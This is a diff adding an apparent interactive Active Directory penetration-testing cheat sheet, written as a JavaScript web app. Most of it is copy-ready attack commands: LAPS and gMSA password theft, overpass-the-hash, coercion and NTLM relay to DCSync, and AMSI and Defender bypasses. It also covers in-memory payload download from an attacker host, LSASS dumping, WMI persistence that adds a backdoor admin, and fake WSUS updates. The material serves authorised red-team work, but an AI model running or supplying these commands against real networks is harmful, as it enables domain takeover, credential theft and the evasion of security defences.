+Find-AdmPwdExtendedRights -Identity "<OU-DistinguishedName>"
+# Example: DOMAIN\\helpdesk -> read LAPS on OU=Workstations
+
+# Read ms-Mcs-AdmPwd directly (if you have the right)
+Get-DomainComputer -Filter "(ms-Mcs-AdmPwdExpirationTime=*)" -Properties Name,ms-Mcs-AdmPwd
+
+# ldapsearch (from Linux)
+ldapsearch -x -H ldap://<DC-IP> -D '<user>@domain.local' -w '<pass>' \\
+  -b "DC=domain,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd name
+
+# BloodHound: look for ReadLAPSPassword edge -> target computer
+
+# Use the local admin password
+evil-winrm -i <target-IP> -u Administrator -p '<LAPS-password>'
+crackmapexec smb <target-IP> -u Administrator -p '<LAPS-password>' --local-auth`,
+    note: 'LAPS passwords rotate on expiry (default 30 days). Windows LAPS (2023+) stores in msLAPS-Password attribute instead of ms-Mcs-AdmPwd. CME/nxc laps module handles both versions.'
+  },
+  {
+    title: 'Overpass-the-Hash — NTLM Hash to Kerberos TGT',
+    req: 'NTLM hash of a domain account',
+    gets: 'Kerberos TGT injected into session — full Kerberos-based access as that user',
+    tags: ['have-hash','proto-kerberos','proto-smb','cat-lateral'],
+    cmd: `# Converts NTLM hash -> Kerberos TGT. Use when NTLM is blocked/monitored.
+
+# Rubeus — request TGT using NTLM hash and inject into session
+Rubeus.exe asktgt /user:<user> /rc4:<NTLM-hash> /domain:<domain.fqdn> /ptt
+
+# Rubeus with AES256 (less detectable than RC4)
+Rubeus.exe asktgt /user:<user> /aes256:<AES256-hash> /domain:<domain.fqdn> /ptt /opsec
+
+# Verify TGT is loaded
+klist
+
+# Mimikatz — spawn new process with NTLM hash
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM-hash> /run:powershell.exe
+# Opens a new PS window — TGT is requested on first Kerberos auth
+
+# impacket — get TGT as .ccache then use with any impacket tool
+impacket-getTGT '<domain>/<user>' -hashes :<NTLM-hash> -dc-ip <DC-IP>
+# Saves: <user>.ccache
+
+export KRB5CCNAME=<user>.ccache
+impacket-psexec -k -no-pass <domain>/<user>@<target>
+impacket-wmiexec -k -no-pass <domain>/<user>@<target>
+impacket-smbexec -k -no-pass <domain>/<user>@<target>`,
+    note: 'PTH sends the NTLM hash directly (blocked by SMB signing or NTLM restrictions). Overpass-the-Hash converts the hash to a Kerberos TGT — works even when NTLM auth is disabled. Extract AES keys too with Mimikatz: sekurlsa::ekeys'
+  },
+  {
+    title: 'Coercion Attacks — Force DC to Authenticate to You',
+    req: 'Network access to DC — PetitPotam unauthenticated (pre-patch) or any valid domain creds',
+    gets: 'DC machine account NetNTLMv2 hash — relay to LDAP/AD CS or crack',
+    tags: ['have-nocreds','have-username','have-password','proto-smb','proto-network','cat-coerce','cat-lateral'],
+    cmd: `# Start listener FIRST, then trigger coercion
+
+# Option A: Capture the hash with Responder
+responder -I <interface> -v
+
+# Option B: Relay to LDAPS (grant DCSync to your user)
+ntlmrelayx.py -t ldaps://<DC-IP> --escalate-user <youruser> -smb2support
+
+# Option C: Relay to AD CS HTTP (ESC8 — see that card)
+ntlmrelayx.py -t http://<CA-IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# ── Coercion methods ───────────────────────────────────────────
+
+# Coercer — tries ALL known coercion methods automatically (best first choice)
+pip install coercer
+coercer scan   -t <DC-IP> -u <user> -p <pass> -d <domain>
+coercer coerce -t <DC-IP> -l <attacker-IP> -u <user> -p <pass> -d <domain>
+
+# PetitPotam (MS-EFSRPC)
+python3 PetitPotam.py <attacker-IP> <DC-IP>                                    # unauthenticated (pre-patch)
+python3 PetitPotam.py -d <domain> -u <user> -p <pass> <attacker-IP> <DC-IP>   # authenticated
+
+# PrinterBug / SpoolSample (MS-RPRN — needs creds)
+python3 printerbug.py '<domain>/<user>:<pass>@<DC-IP>' <attacker-IP>
+.\\SpoolSample.exe <DC-IP> <attacker-IP>
+
+# DFSCoerce (MS-DFSNM)
+python3 dfscoerce.py -d <domain> -u <user> -p <pass> <attacker-IP> <DC-IP>
+
+# Crack the captured DC machine account hash
+hashcat -m 5600 dc_hash.txt /usr/share/wordlists/rockyou.txt`,
+    note: 'PetitPotam unauthenticated is patched (Aug 2021) — but authenticated coercion still works with any valid domain account. The DC machine account hash is best used for relay (ESC8 card) rather than cracking. Combine with ntlmrelayx for the most impactful result.'
+  },
+  {
+    title: 'ESC8 — NTLM Relay to AD CS Web Enrollment (HTTP)',
+    req: 'ADCS with HTTP web enrollment enabled (no HTTPS, or no Extended Protection for Auth)',
+    gets: 'Certificate for the DC machine account -> certipy auth -> DCSync',
+    tags: ['have-adcs','have-nocreds','proto-network','proto-smb','cat-adcs','cat-coerce','cat-relay'],
+    cmd: `# Full chain: Coerce DC -> Relay to CA HTTP -> Get DC cert -> DCSync (no prior creds needed)
+
+# Step 1: Verify CA web enrollment is over HTTP
+curl -s http://<CA-IP>/certsrv/ | head -5   # should return HTML
+certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -stdout | grep -i "web enrollment"
+
+# Step 2: Start ntlmrelayx targeting AD CS HTTP endpoint
+ntlmrelayx.py -t http://<CA-IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# --adcs: enable AD CS relay mode (returns base64 PFX certificate)
+# --template: use DomainController or Machine depending on CA config
+
+# Step 3: Coerce DC authentication
+python3 PetitPotam.py <attacker-IP> <DC-IP>        # unauthenticated (if unpatched)
+# OR any other method: Coercer, PrinterBug, DFSCoerce
+
+# ntlmrelayx output: [*] Got certificate! Saving as dc01.pfx
+# If base64 PFX printed: echo <base64> | base64 -d > dc01.pfx
+
+# Step 4: Use the DC certificate to retrieve the NT hash
+certipy auth -pfx dc01.pfx -dc-ip <DC-IP>
+# Returns: DC01$:aad3b435b51404eeaad3b435b51404ee:<NT-hash>
+
+# Step 5: DCSync using DC machine account hash
+impacket-secretsdump '<domain>/DC01$@<DC-IP>' -hashes aad3b435b51404eeaad3b435b51404ee:<NT-hash>`,
+    note: 'Works with zero prior credentials if PetitPotam is unpatched. Full chain: network access -> DA in under 5 minutes. Mitigated by: HTTPS on certsrv, enabling EPA (Extended Protection for Authentication), disabling HTTP web enrollment entirely.'
+  },
+  {
+    title: 'gMSA — Group Managed Service Account Password Retrieval',
+    req: 'Membership in the account PrincipalsAllowedToRetrieveManagedPassword group, or ReadGMSAPassword ACE',
+    gets: 'NT hash of the gMSA service account (often high-privilege service or admin account)',
+    tags: ['have-foothold','have-localadmin','proto-ldap','cat-dump','cat-enum'],
+    cmd: `# BloodHound edge: ReadGMSAPassword -> gMSA account
+
+# Discover gMSA accounts and who can read their passwords
+Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword,Name
+
+# Method 1: nxc / crackmapexec (easiest from Linux)
+nxc ldap <DC-IP> -u <user> -p <pass> --gmsa
+# Output: gmsa_svc$ NT: aad3b435b51404eeaad3b435b51404ee:<NT-hash>
+
+# Method 2: GMSAPasswordReader (from Windows)
+.\\GMSAPasswordReader.exe --accountname <gMSA-name>
+# Returns: RC4 (NTLM) hash and AES256 hash
+
+# Method 3: DSInternals PowerShell module
+Install-Module DSInternals
+$gmsa = Get-ADServiceAccount -Identity <gMSA-name> -Properties 'msDS-ManagedPassword'
+$mp   = $gmsa.'msDS-ManagedPassword'
+$dec  = ConvertFrom-ADManagedPasswordBlob $mp
+ConvertTo-NTHash -Password $dec.CurrentPassword
+
+# Method 4: bloodyAD (Linux, no module needed)
+bloodyAD --host <DC-IP> -d <domain> -u <user> -p <pass> get object '<gMSA_name$>' --attr msDS-ManagedPassword
+
+# Use the NT hash for PTH
+evil-winrm -i <target-IP> -u '<gMSA_name$>' -H <NT-hash>
+impacket-secretsdump '<domain>/<gMSA_name$>@<IP>' -hashes :<NT-hash>`,
+    note: 'gMSA passwords rotate every 30 days. The account name ends with $ (machine account format). BloodHound ReadGMSAPassword edge shows exactly who can read which gMSA. If gMSA is in a high-priv group (e.g. Domain Admins, Cert Publishers), this is a direct path to escalation.'
+  },
+  {
+    title: 'AMSI Bypass + Defender Evasion',
+    req: 'PowerShell session on target — needed before running offensive PS tools',
+    gets: 'Ability to load PowerView, Rubeus, SharpHound etc. without AMSI/Defender blocking',
+    tags: ['have-foothold','cat-privesc'],
+    cmd: `# AMSI (Antimalware Scan Interface) scans PS scripts before execution — bypass first
+
+# Method 1: Set amsiInitFailed (classic — may be signature-detected)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Method 2: Split across variables (evades string-based signatures)
+$x = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$x.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Method 3: Use amsi.fail for fresh randomized memory-patch bypasses
+# https://amsi.fail — generates novel AMSI patch code each visit
+
+# Execution Policy bypass (not a security boundary — trivial to bypass)
+powershell -ep bypass
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+# Load scripts from memory — no disk write, avoids file-based AV
+IEX (New-Object Net.WebClient).DownloadString('http://<attacker-IP>/PowerView.ps1')
+IEX (IWR 'http://<attacker-IP>/PowerView.ps1' -UseBasicParsing).Content
+
+# Check current language mode (ConstrainedLanguage = AppLocker/WDAC active)
+$ExecutionContext.SessionState.LanguageMode
+
+# PSv2 bypass — no AMSI in PSv2 (if .NET 2.0 installed)
+powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')"
+
+# Disable Defender real-time protection (requires local admin + Tamper Protection off)
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -ExclusionPath "C:\\Windows\\Temp"
+
+# Check Defender status
+Get-MpComputerStatus | Select RealTimeProtectionEnabled,AMSIEnabled,IsTamperProtected`,
+    note: 'Tamper Protection (Defender settings) blocks Set-MpPreference changes even with local admin. If CLM (ConstrainedLanguage Mode) is active, use a compiled .NET binary or PowerShell runspace instead. AMSI bypass signatures update frequently — always use fresh/obfuscated variants from amsi.fail.'
+  },
+  {
+    title: 'PrivExchange — Exchange WriteDACL on Domain -> DCSync',
+    req: 'Exchange server present (pre-2019 mitigation patches), valid domain credentials',
+    gets: 'DCSync rights on the domain -> all domain hashes',
+    tags: ['have-exchange','have-username','have-password','proto-ldap','proto-network','cat-exploit','cat-relay','cat-coerce'],
+    cmd: `# Exchange has WriteDACL on the domain object by default
+# Relay Exchange auth to LDAP -> grant yourself DCSync rights
+
+# Step 1: Confirm Exchange is present
+Get-DomainComputer -Filter "(serviceprincipalname=*exchangeMDB*)" | Select Name,dnshostname
+
+# Step 2: Start ntlmrelayx — relay Exchange auth to DC, escalate your user
+ntlmrelayx.py -t ldap://<DC-IP> --escalate-user <your-user> -smb2support
+# If LDAP signing enforced, use LDAPS:
+ntlmrelayx.py -t ldaps://<DC-IP> --escalate-user <your-user> -smb2support
+
+# Step 3: Trigger Exchange PushSubscription -> Exchange authenticates to attacker
+python3 privexchange.py -ah <attacker-IP> <Exchange-IP> -u <user> -p '<pass>' -d <domain>
+# ntlmrelayx output: "Privilege escalation successful, <your-user> now has DCSync rights"
+
+# Step 4: DCSync with your escalated user
+impacket-secretsdump '<domain>/<your-user>:<pass>@<DC-IP>'
+
+# Verify Exchange has WriteDACL (PowerView)
+Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs |
+  Where-Object { $_.IdentityReference -like "*Exchange*" } |
+  Select IdentityReference,ActiveDirectoryRights`,
+    note: 'Mitigated in Exchange 2013 CU23+, 2016 CU14+, 2019 CU3+ (Microsoft removed the WriteDACL ACE). Many environments remain unpatched. Can also relay Exchange computer account authentication (not just user-triggered subscription).'
+  },
+  {
+    title: 'MSSQL xp_dirtree — Coerce SQL Service to Authenticate to You',
+    req: 'Any valid MSSQL login — even PUBLIC role, no sysadmin required',
+    gets: 'NetNTLMv2 hash of the MSSQL service account — crack or relay',
+    tags: ['have-foothold','proto-mssql','proto-smb','cat-dump','cat-lateral'],
+    cmd: `# xp_dirtree triggers MSSQL to make a UNC connection -> NTLM auth to your machine
+# Works with PUBLIC role — sysadmin NOT required
+
+# Step 1: Start Responder to capture the hash
+responder -I <interface> -v
+# OR relay it to another target:
+ntlmrelayx.py -t smb://<target-IP> -smb2support
+
+# Step 2: Connect to MSSQL
+impacket-mssqlclient '<domain>/<user>:<pass>@<MSSQL-IP>'
+
+# Step 3: Trigger UNC authentication
+SQL> EXEC xp_dirtree '\\\\<attacker-IP>\\share', 1, 1
+-- OR
+SQL> EXEC xp_fileexist '\\\\<attacker-IP>\\share\\file'
+-- OR (if xp_dirtree is blocked)
+SQL> EXEC master..xp_subdirs '\\\\<attacker-IP>\\share'
+
+# Responder captures: MSSQL-svc::<domain>:<challenge>:<NTLMv2-hash>
+
+# Step 4: Crack
+hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Step 5: If service account = domain account -> spray / WinRM / PTH laterally`,
+    note: 'SQL Server often runs as a domain service account (DOMAIN\\sql_svc) or SYSTEM. SYSTEM = machine account hash = less useful for auth. Domain service account = crackable and reusable across the domain. Also works via linked servers: EXEC (xp_dirtree ...) AT [linked-server]'
+  },
+  {
+    title: 'LSASS Dump Alternatives — When Mimikatz is Blocked',
+    req: 'Local admin on target (SeDebugPrivilege or SYSTEM)',
+    gets: 'LSASS memory dump — parse offline with pypykatz or Mimikatz for all creds and hashes',
+    tags: ['have-localadmin','have-foothold','cat-dump'],
+    cmd: `# Use signed/built-in binaries to dump LSASS — no Mimikatz.exe on disk
+
+# Method 1: comsvcs.dll MiniDump — built-in Windows LOLBin (nothing to upload)
+$lsassPID = (Get-Process lsass).Id
+rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPID C:\\Windows\\Temp\\lsass.dmp full
+
+# Method 2: ProcDump — Microsoft-signed Sysinternals binary (often allowed by AV)
+.\\procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp
+
+# Method 3: Task Manager (if you have a GUI session)
+# Task Manager -> Details tab -> lsass.exe -> Right-click -> Create dump file
+
+# Method 4: SilentProcessExit via Windows Error Reporting
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v ReportingMode /t REG_DWORD /d 1 /f
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v MonitorProcess /t REG_SZ /d "cmd.exe" /f
+
+# Method 5: nanodump — dumps only credential regions (smaller + stealthier)
+.\\nanodump.exe --write C:\\Windows\\Temp\\lsass.dmp
+
+# Transfer dump to attacker machine
+download C:\\Windows\\Temp\\lsass.dmp    # evil-winrm built-in
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\\Windows\\Temp\\lsass.dmp"))  # base64
+
+# Parse OFFLINE on attacker (avoids AV on target):
+pypykatz lsa minidump lsass.dmp
+impacket-secretsdump -security lsass.dmp LOCAL`,
+    note: 'comsvcs.dll MiniDump is the most reliable LOLBin — no upload needed, signed by Microsoft. Some EDRs hook comsvcs.dll; use nanodump or SilentProcessExit as fallback. Always parse the dump offline on your attacker machine to avoid triggering AV on the target.'
+  },
+  {
+    title: 'WMI Event Subscription — Fileless Persistence',
+    req: 'Local admin on target (write access to root\\subscription WMI namespace)',
+    gets: 'Persistent code execution on trigger (logon, timer, process start) — survives reboot, no file on disk',
+    tags: ['have-localadmin','cat-persist'],
+    cmd: `# WMI subscriptions: no registry startup key, no service, no file on disk
+# Stored in WMI repository (C:\\Windows\\System32\\wbem\\Repository)
+
+$filterName   = "WinUpdateFilter"
+$consumerName = "WinUpdateConsumer"
+$payload      = "cmd.exe /c net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add"
+
+# 1. EventFilter — defines what WMI event triggers the payload
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{
+    Name           = $filterName
+    EventNamespace = "root\\cimv2"
+    QueryLanguage  = "WQL"
+    Query          = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
+}
+
+# 2. EventConsumer — what to run when event fires
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{
+    Name                = $consumerName
+    CommandLineTemplate = $payload
+}
+
+# 3. Bind filter to consumer
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{
+    Filter = $filter; Consumer = $consumer
+}
+
+# List existing subscriptions (for detection check)
+Get-WMIObject -Namespace root\\subscription -Class __EventFilter
+Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer
+
+# Cleanup
+Get-WMIObject -Namespace root\\subscription -Class __EventFilter |
+  Where-Object { $_.Name -eq $filterName } | Remove-WmiObject
+Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer |
+  Where-Object { $_.Name -eq $consumerName } | Remove-WmiObject`,
+    note: 'WMI subscriptions execute as SYSTEM. Alternative triggers: __TimerEvent (time-based), Win32_ProcessStartTrace (specific process launch). Detected by Sysmon Event IDs 19 (filter), 20 (consumer), 21 (binding). Can also use ActiveScriptEventConsumer to run VBScript payloads.'
+  },
+  {
+    title: 'WSUS Attack — Fake Windows Update via PyWSUS / SharpWSUS',
+    req: 'WSUS configured over HTTP port 8530 (not HTTPS) — check via client registry key',
+    gets: 'SYSTEM shell on any managed Windows endpoint that receives the fake update',
+    tags: ['have-foothold','have-localadmin','proto-network','cat-privesc','cat-exploit'],
+    cmd: `# WSUS over HTTP (not HTTPS) = unauthenticated -> inject fake updates -> SYSTEM on endpoints
+
+# Step 1: Check if the target uses HTTP WSUS (from any domain-joined machine)
+reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer
+# Vulnerable if value starts with http:// (not https://)
+
+# Step 2a: PyWSUS — MitM the HTTP WSUS traffic on port 8530
+# Requires: ARP spoof or DNS-poison the WSUS server hostname to your IP first
+git clone https://github.com/GoSecure/pywsus
+python3 pywsus.py -H <attacker-IP> -p 8530 \\
+  -e .\\PsExec64.exe \\
+  -c "/accepteula /s cmd.exe /c net user hacker P@ss /add"
+# Clients polling WSUS receive the fake update and execute as SYSTEM
+
+# Step 2b: SharpWSUS — interact with WSUS server directly
+# Requires: write access to the WSUS SQL Server backend
+.\\SharpWSUS.exe create /payload:"C:\\Users\\Public\\PsExec64.exe" /args:"/accepteula /s cmd.exe /c net user hacker P@ss /add" /title:"Critical Security Update KB12345678"
+# Save the UpdateID from output
+
+.\\SharpWSUS.exe approve /id:<UpdateID> /computername:<target-FQDN>
+.\\SharpWSUS.exe check   /id:<UpdateID> /computername:<target-FQDN>   # wait for exec
+.\\SharpWSUS.exe delete  /id:<UpdateID> /computername:<target-FQDN>   # cleanup
+
+# Force client to check for updates immediately
+wuauclt /detectnow /reportnow`,
+    note: 'Update execution runs as SYSTEM via Windows Update service. SharpWSUS requires WSUS admin rights or direct SQL Server access. PyWSUS only needs a network MITM position. Default check interval is 22 hours — force with wuauclt or just wait. All approved updates must be signed by Microsoft, so PyWSUS uses a legitimate signed PsExec as the delivery vehicle.'
+  }
+];
+
+// ── Render ────────────────────────────────────────────────────────────────────
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+const TAG_LABEL = {
+  'have-nocreds':'No Creds','have-username':'Username','have-password':'Password',
+  'have-hash':'NTLM Hash','have-localadmin':'Local Admin','have-domainadmin':'Domain Admin',
+  'proto-smb':'SMB','proto-ldap':'LDAP','proto-kerberos':'Kerberos',
+  'proto-winrm':'WinRM','proto-rdp':'RDP','proto-mssql':'MSSQL',
+  'proto-ssh':'SSH','proto-network':'Network',
+  'cat-enum':'Enum','cat-spray':'Spray','cat-dump':'Cred Dump',
+  'cat-lateral':'Lateral','cat-privesc':'Priv Esc','cat-persist':'Persist',
+  'cat-adcs':'ADCS','cat-bloodhound':'BloodHound',
+  'cat-delegation':'Delegation','cat-trusts':'Trust Attack','cat-exploit':'CVE/Exploit',
+  'have-foothold':'Foothold','proto-dns':'DNS',
+  'have-adcs':'ADCS Present','have-exchange':'Exchange',
+  'cat-coerce':'Coercion','cat-relay':'NTLM Relay'
+};
+
+function buildCard(t, idx){
+  const tags = t.tags.map(tag =>
+    `<span class="tag t-${tag}">${TAG_LABEL[tag]||tag}</span>`
+  ).join('');
+  const metaReq = t.req ? `<div class="mi"><div class="ml">Requires</div><div class="mv">${esc(t.req)}</div></div>` : '';
+  const metaGets = t.gets ? `<div class="mi"><div class="ml">Gets You</div><div class="mv">${esc(t.gets)}</div></div>` : '';
+  const meta = (metaReq||metaGets) ? `<div class="meta">${metaReq}${metaGets}</div>` : '';
+  const note = t.note ? `<div class="note">${esc(t.note)}</div>` : '';
+  const warn = t.warn ? `<div class="warn">${esc(t.warn)}</div>` : '';
+  const ref = t.ref ? `<a class="reflink" href="${t.ref}" target="_blank" rel="noopener">Reference &rarr;</a>` : '';
+  const cmdBlock = `<div class="cblock"><pre>${esc(t.cmd)}</pre><button class="cpbtn" data-idx="${idx}">Copy</button></div>`;
+  const searchText = [t.title,t.req||'',t.gets||'',t.cmd,t.note||'',t.warn||''].join(' ').toLowerCase();
+  return `<div class="card" data-tags="${t.tags.join(' ')}" data-text="${searchText.replace(/"/g,'&quot;')}">
+  <div class="ch" onclick="toggle(this)">
+    <span class="ct">${esc(t.title)}</span>
+    <span class="cv">&#9660;</span>
+  </div>
+  <div class="ctags">${tags}</div>
+  <div class="cb">${meta}${note}${warn}${cmdBlock}${ref}</div>
+</div>`;
+}
+
+const container = document.getElementById('cards');
+container.innerHTML = D.map(buildCard).join('');
+
+// ── Toggle card open/close ────────────────────────────────────────────────────
+function toggle(header){
+  header.closest('.card').classList.toggle('open');
+}
+
+// ── Copy button ───────────────────────────────────────────────────────────────
+container.addEventListener('click', e=>{
+  if(!e.target.classList.contains('cpbtn')) return;
+  const idx = +e.target.dataset.idx;
+  navigator.clipboard.writeText(D[idx].cmd).then(()=>{
+    e.target.textContent='Copied!';
+    e.target.classList.add('ok');
+    setTimeout(()=>{e.target.textContent='Copy';e.target.classList.remove('ok')},1500);
+  });
+});
+
+// ── Filter logic ─────────────────────────────────────────────────────────────
+// "I Have" group uses a privilege hierarchy:
+//   selecting 'have-password' implicitly covers 'have-username' and 'have-nocreds'.
+//   Cards whose have-* requirements exceed what you selected are hidden.
+//   Environmental tags (have-adcs, have-exchange) are NOT in the chain —
+//   a card tagged with them only shows when that env tag is explicitly selected.
+const PRIV_TAGS = new Set([
+  'have-nocreds','have-username','have-password',
+  'have-hash','have-foothold','have-localadmin','have-domainadmin'
+]);
+const HAVE_IMPLIES = {
+  'have-nocreds':    [],
+  'have-username':   ['have-nocreds'],
+  'have-password':   ['have-username','have-nocreds'],
+  'have-hash':       ['have-password','have-username','have-nocreds'],
+  'have-foothold':   ['have-password','have-username','have-nocreds'],
+  'have-localadmin': ['have-foothold','have-hash','have-password','have-username','have-nocreds'],
+  'have-domainadmin':['have-localadmin','have-foothold','have-hash','have-password','have-username','have-nocreds']
+};
+
+function applyFilters(){
+  const groups = {};
+  document.querySelectorAll('.fb.on').forEach(btn=>{
+    const g = btn.dataset.g, v = btn.dataset.v;
+    if(!groups[g]) groups[g]=new Set();
+    groups[g].add(v);
+  });
+
+  const selHave = groups['have'] || new Set();
+
+  // Build effective privilege set: selected priv tags + everything they imply
+  const effPriv = new Set();
+  selHave.forEach(tag=>{
+    if(PRIV_TAGS.has(tag)){
+      effPriv.add(tag);
+      (HAVE_IMPLIES[tag]||[]).forEach(t=>effPriv.add(t));
+    }
+  });
+
+  const q = document.getElementById('search').value.toLowerCase().trim();
+  let vis=0;
+  document.querySelectorAll('.card').forEach(card=>{
+    const cardTags = card.dataset.tags.split(' ');
+    const tagSet   = new Set(cardTags);
+
+    let haveMatch = true;
+    if(selHave.size > 0){
+      const cardPrivTags = cardTags.filter(t=>PRIV_TAGS.has(t));
+      const cardEnvTags  = cardTags.filter(t=>t.startsWith('have-') && !PRIV_TAGS.has(t));
+
+      // Privilege gate: every priv-tag the card needs must be covered by effective set
+      const privOk = effPriv.size===0 || cardPrivTags.every(t=>effPriv.has(t));
+
+      // Environment gate: every env-tag the card needs must be explicitly selected
+      const envOk  = cardEnvTags.every(t=>selHave.has(t));
+
+      haveMatch = privOk && envOk;
+    }
+
+    // proto + cat groups: OR within group, AND between groups (unchanged)
+    const otherMatch = Object.entries(groups)
+      .filter(([g])=>g!=='have')
+      .every(([,vals])=>[...vals].some(v=>tagSet.has(v)));
+
+    const matchSearch = !q || card.dataset.text.includes(q);
+    const show = haveMatch && otherMatch && matchSearch;
+    card.style.display = show ? '' : 'none';
+    if(show) vis++;
+  });
+  const c = document.getElementById('count');
+  c.textContent = `${vis} of ${D.length} techniques`;
+  if(vis===0){
+    if(!document.querySelector('.nores')){
+      const d=document.createElement('div');
+      d.className='nores';d.textContent='No techniques match. Try clearing some filters.';
+      container.appendChild(d);
+    }
+  } else {
+    const nr=document.querySelector('.nores');
+    if(nr) nr.remove();
+  }
+}
+
+// ── Filter button toggle ──────────────────────────────────────────────────────
+document.querySelectorAll('.fb').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    btn.classList.toggle('on');
+    applyFilters();
+  });
+});
+
+document.getElementById('clear-btn').addEventListener('click',()=>{
+  document.querySelectorAll('.fb.on').forEach(b=>b.classList.remove('on'));
+  document.getElementById('search').value='';
+  applyFilters();
+});
+
+document.getElementById('search').addEventListener('input', applyFilters);
+
+// Init count
+applyFilters();
+
+// ── View tab switching ────────────────────────────────────────────────────────
+document.querySelectorAll('.vtab').forEach(btn=>{
+  btn.addEventListener('click',()=>{
+    document.querySelectorAll('.vtab').forEach(b=>b.classList.remove('active'));
+    btn.classList.add('active');
+    const v = btn.dataset.view;
+    document.getElementById('cards-section').style.display = v==='cards' ? '' : 'none';
+    document.getElementById('flow-view').style.display     = v==='flow'  ? '' : 'none';
+  });
+});
+
+// ── Flow phases data ──────────────────────────────────────────────────────────
+const FLOW = [
+  {id:'p0',label:'Pre-Flight Checks',color:'#8b949e',jump:{have:[],cat:['cat-enum']},items:[
+    'Identify DC IP — nmap port 88/389/53 or ipconfig /all from foothold',
+    'Note domain FQDN (from nmap, LDAP, or DNS reverse lookup)',
+    'Check if ADCS present — port 443, try http://&lt;IP&gt;/certsrv/',
+    'Check if Exchange present — port 443/25, look for OWA login page',
+    'Check WSUS — port 8530 HTTP = potentially exploitable',
+    'Check if MSSQL exposed — port 1433',
+    'Confirm IP scope — ranges in/out of scope',
+  ]},
+  {id:'p1',label:'Phase 1 — No Credentials',color:'#f85149',jump:{have:['have-nocreds'],cat:[]},items:[
+    'SMB null/guest session — CME smb -u guest -p "" --shares',
+    'RID cycling / lookupsid — if null session works, enumerate all users',
+    'LDAP anonymous bind — windapsearch -U or ldapsearch -x',
+    'Kerbrute username enumeration — against kerberos :88',
+    'AS-REP roasting — GetNPUsers with generated username list',
+    'LLMNR/NBT-NS poisoning — start Responder',
+    'Check SMB signing — CME --gen-relay-list; if disabled set up ntlmrelayx',
+    'NTLM relay attack if SMB signing is off',
+    'Coercion (PetitPotam unauthenticated if unpatched) → relay to LDAP/ADCS',
+  ]},
+  {id:'p2',label:'Phase 2 — Valid Credentials',color:'#ffa657',jump:{have:['have-password'],cat:[]},items:[
+    'Validate creds — CME smb &lt;DC-IP&gt; -u &lt;user&gt; -p &lt;pass&gt;',
+    'Check lockout policy BEFORE spraying — CME --pass-pol',
+    'Password spray — 1 attempt per lockout window, --continue-on-success',
+    'CME --users → scan description fields for plaintext passwords',
+    'Spider all non-default SMB shares — look for .ps1 .bat .xml .config files',
+    'BloodHound collection — bloodhound-python or SharpHound',
+    'Kerberoasting — GetUserSPNs → crack hashes offline',
+    'AS-REP roasting with valid creds (catches all preauth-disabled users)',
+    'Full LDAP dump — ldapdomaindump or windapsearch',
+    'ADCS enumeration — certipy find --vulnerable (if ADCS present)',
+    'LAPS check — CME -M laps',
+    'gMSA check — nxc ldap --gmsa',
+    'adPEAS remote enumeration from Linux',
+  ]},
+  {id:'p3',label:'Phase 3 — Foothold / Shell',color:'#79c0ff',jump:{have:['have-foothold'],cat:['cat-enum','cat-dump']},items:[
+    'whoami /priv — check SeImpersonate, SeBackup, SeDebug, SeRestore',
+    'whoami /groups — check Backup Operators, Server Operators, Account Operators',
+    'WinPEAS full run — autologon creds, weak services, stored credentials',
+    'AutoLogon creds — reg query Winlogon',
+    'LAPS — is ms-Mcs-AdmPwd readable? (CME laps or PowerView)',
+    'gMSA — GMSAPasswordReader or nxc ldap --gmsa',
+    'DPAPI — browser saved passwords, credential manager',
+    'LSASS dump — comsvcs.dll MiniDump, ProcDump, or nanodump',
+    'Upload SharpHound → collect → download → import to BloodHound',
+    'Mark current user as Owned in BloodHound (skull icon, right-click node)',
+    'BloodHound: run "Shortest Paths from Owned Principals"',
+    'BloodHound: mark high-value targets (Exchange, ADCS, MSSQL servers)',
+  ]},
+  {id:'p4',label:'Phase 4 — Lateral Movement',color:'#d2a8ff',jump:{have:['have-hash'],cat:['cat-lateral']},items:[
+    'CME PTH spray across subnet with --local-auth — find local admin reuse',
+    'BloodHound: follow edges from Owned principals to new targets',
+    'ACL abuse — GenericAll / WriteDACL / WriteOwner / GenericWrite',
+    'Pass-the-Hash to machines where you are local admin',
+    'Overpass-the-Hash — NTLM hash → Kerberos TGT (Rubeus asktgt /rc4)',
+    'Find logged-in admins — PowerView Find-DomainUserLocation',
+    'Coercion attacks — PetitPotam/Coercer → relay to LDAP or AD CS',
+    'Check Kerberos delegation edges in BloodHound',
